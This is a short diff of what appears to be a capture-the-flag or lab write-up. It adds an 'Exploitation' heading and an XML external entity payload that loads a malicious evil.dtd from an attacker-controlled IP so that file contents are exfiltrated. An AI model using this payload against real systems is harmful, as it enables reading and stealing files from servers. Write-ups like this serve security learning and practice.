@@ -26,6 +26,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.192 - - [12/May/2023 12:35:19] "GET / HTTP/1.1" 200 -
 ```
 
+# Exploitation
+
 we can host a malicious evil.dtd that exfiltrates file contents
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.8/evil.dtd">%xxe;]>>
